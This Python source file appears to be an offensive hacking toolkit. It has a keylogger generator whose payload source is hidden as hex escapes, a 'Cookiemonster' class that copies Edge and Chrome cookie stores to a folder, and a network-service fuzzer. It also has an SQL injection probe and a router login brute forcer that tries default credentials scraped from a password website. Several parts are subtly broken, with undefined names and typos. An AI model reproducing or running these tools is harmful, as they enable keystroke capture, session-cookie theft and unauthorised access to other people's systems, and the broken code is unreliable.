import os
import re
import requests
from socket import *
from argparse import *
from platform import *
from shutil import copy
from bs4 import BeautifulSoup


class ArgParser(ArgumentParser):
    '''Program Usage. Returns arguments being passed'''
    def add_option(self, arg, optional_arg, descr=''):
        self.add_argument(arg, optional_arg, help=descr)

    '''parses arguments'''
    def parse(self):
        return self.parse_args()


class Seeker(object):
    '''loops files given path and matches a particular string.'''
    def __init__(self):
        self.count = []

    def __len__(self):
        return len(self.count)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''searches for files using a path and file name'''
    def search_file(self, filename, path):
        for path, directories, files in os.walk(path):
            for Filename in files:
                if filename.lower() in Filename.lower():
                    print(os.path.join(path, Filename))
                    self.count.append(Filename)


class System(object):
    '''Attempts To Find System Hardware, Hostname and Operating System.'''
    def __init__(self):
        self.platform = platform()
        self.architecture = architecture()[0]
        self.hostname = node()
        self.processor = processor()

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    ''' returns the platform the archiecture
            hostname and processor of the system'''
    def get(self):
        return self.platform, self.architecture, self.hostname, self.processor


class Ip(object):
    '''Fetches ip using http://checkip.dyndns.org'''
    def __init__(self):
        self.url = 'http://checkip.dyndns.org'

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''requests a page and uses regular expressions to extract the Ip
        and returns the value'''
    def get(self):
        request = requests.get(self.url)
        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
        return ip


class Keylogger(object):
    '''Generates a keylogger script'''
    def __init__(self):
        self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d"
        self.code += "\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68"
        self.code += "\x6f\x6e\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72"
        self.code += "\x74\x20\x6c\x6f\x67\x67\x69\x6e\x67\x0d\x0a\x0d\x0a\x69"
        self.code += "\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0d\x0a\x0d\x0a\x0d\x0a"
        self.code += "\x0d\x0a\x0d\x0a\x0d\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x3a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"
        self.code += "\x28\x73\x65\x6c\x66\x29\x3a\x0d\x0a\x0d\x0a\x20\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x78\x74"
        self.code += "\x6c\x6f\x67\x20\x3d\x20\x6f\x73\x2e\x67\x65\x74\x63\x77"
        self.code += "\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x20"
        self.code += "\x3d\x20\x70\x79\x48\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b\x4d"
        self.code += "\x61\x6e\x61\x67\x65\x72\x28\x29\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68"
        self.code += "\x68\x6f\x6f\x6b\x2e\x4b\x65\x79\x44\x6f\x77\x6e\x20\x3d"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x67\x65\x74\x6b\x65\x79\x73\x0d"
        self.code += "\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c"
        self.code += "\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b"
        self.code += "\x4b\x65\x79\x62\x6f\x61\x72\x64\x28\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x79\x74\x68\x6f\x6e"
        self.code += "\x63\x6f\x6d\x2e\x50\x75\x6d\x70\x4d\x65\x73\x73\x61\x67"
        self.code += "\x65\x73\x28\x29\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x67\x65\x74\x6b\x65\x79\x73\x28"
        self.code += "\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29\x3a\x0d\x0a\x0d"
        self.code += "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69"
        self.code += "\x6e\x67\x2e\x62\x61\x73\x69\x63\x43\x6f\x6e\x66\x69\x67"
        self.code += "\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x73\x65\x6c\x66"
        self.code += "\x2e\x74\x65\x78\x74\x6c\x6f\x67\x2c\x20\x6c\x65\x76\x65"
        self.code += "\x6c\x3d\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x44\x45\x42\x55"
        self.code += "\x47\x2c\x20\x66\x6f\x72\x6d\x61\x74\x3d\x27\x25\x28\x6d"
        self.code += "\x65\x73\x73\x61\x67\x65\x29\x73\x27\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x63\x68\x72\x28\x6b\x65"
        self.code += "\x79\x2e\x41\x73\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69\x6e\x67"
        self.code += "\x2e\x6c\x6f\x67\x28\x31\x30\x2c\x20\x63\x68\x72\x28\x6b"
        self.code += "\x65\x79\x2e\x41\x73\x63\x69\x69\x29\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x69\x6e\x74\x20"
        self.code += "\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73\x63\x69\x69\x29"
        self.code += "\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72"
        self.code += "\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0d\x0a\x0d\x0a"
        self.code += "\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"

    def __len__(self):
        return len(self.code)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''creates a file and writes the source code'''
    def save(self, filename):
        with open(filename, 'w') as source:
            source.write(self.code)
            source.close()


class Scrape(object):
    '''Fecthes a Specific page and finds links'''
    def __init__(self, page):
        self.page = requests.get(page)
        self.content = self.page.content
        self.href_parser = BeautifulSoup(self.content, "html.parser")

    def __len__(self):
        return len(self.href_parser.findAll('a'))

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''within finding all "a" tags prints the reference links'''
    def scrape(self):
        for link in self.href_parser.findAll("a"):
            print(link.get("href"))


class Cookiemonster(object):
    '''Fetches locally stored cookies'''
    def __init__(self):
        self.files = []
        self.lap = os.environ.get("localappdata")
        self.cookie_paths = ["{}\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Google\\Chrome\\User Data\\Default\\Cookies".format(self.lap),
                                "{}\Microsoft\\Windows\\INetCookies".format(self.lap)]

    def __len__(self):
        for paths in self.cookie_paths:
            try:
                for filename in os.listdir(paths):
                    self.files.append(os.path.join(paths, filename))
            except Exception as e:
                pass
        return len(files)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''attempts to display all cookies'''
    def show(self):
        for paths in self.cookie_paths:
            try:
                for filename in os.listdir(paths):
                    print(os.path.join(paths, filename))
            except Exception as e:
                pass

    '''save cookies to a directory using a path'''
    def save(self, path, dir_name):
        cookie_jar = os.path.join(path, dir_name)
        if not os.path.exists(cookie_jar):
            os.mkdir(dirame)
            for paths in self.cookie_paths:
                try:
                    for filename in os.listdir(paths):
                        copy(os.path.join(paths, filename), cookie_jar)
                except Exception as e:
                    pass


class NetFuzzer(object):
    '''Fuzzer For Network Services'''
    def __init__(self, host, port):
        self.sock = socket()
        self.host = host
        self.port = port

    def __len__(self):
        return len(self.buffer)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''creates a buffer'''
    def buildbuffer(self, chars, length):
        self.buffer = chars * length
        return self.buffer

    '''fuzzez the target'''
    def fuzz(self):
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        self.sock.recv(recvsize)
        self.sock.send(self.buffer.encode())
        self.sock.recv(recvsize)
        return self.sock.recv(4096)

    '''checks if service is still running'''
    def status(self):
        service = socket()
        service.settimeout(10)
        service.connect((self.host, self.port))
        if service.recv(4096):
            return True
        return False


class SQLInject(object):
    '''SQL Injection'''
    def __init__(self, url):
        self.errors = []
        self.url = url

    def __len__(self):
        return len(self.errors)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    ''' inject in url '''
    def urlinject(self, injection):
        page = requests.get(self.url + injection)
        errors = re.findall('You have an error in your SQL syntax;',
                            page.content.decode())
        for error in errors:
            if error:
                self.errors.append(error)
                return True
        return False

    '''sql inject into a form'''
    def forminject(self, injection):
        page = request.post(self.url, data=injection)
        return page.content()


class RouterDAuth(object):
    '''Router Default Authentication Check'''
    def __init__(self):
        self.page = "http://www.routerpasswords.com/"
        self.login_page = ""
        self.models = []
        self.protocols = []
        self.usernames = []
        self.passwords = []

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''fetches passwords given router manufacture name from
        http://www.routerpasswords.com/'''
    def getpasswords(self, router_name):
        payload = {"findpass": "1",
                    "router": router_name,
                    "findpassword": "Find Password"}
        page = requests.post(self.page, data=payload)
        parser = BeautifulSoup(page.content, 'html.parser')
        for table_rows in parser.find_all('tr')[1:]:
            table_data = table_rows.find_all('td')
            self.models.append(table_data[1].text)
            self.protocols.append(table_data[2].text)
            self.usernames.append(table_data[3].text)
            self.passwords.append(table_data[4].text)

    '''set target using url'''
    def target(self, login_page):
        self.login_page = login_page
        return login_page

    '''checks router Authentication using default credentials'''
    def check(self, usernames, passwords):
        for username in usernames:
            for password in passwords:
                page = requests.get(self.loginpage, auth=(username, password))
                if page.status_code == 200:
                    return True
        return False
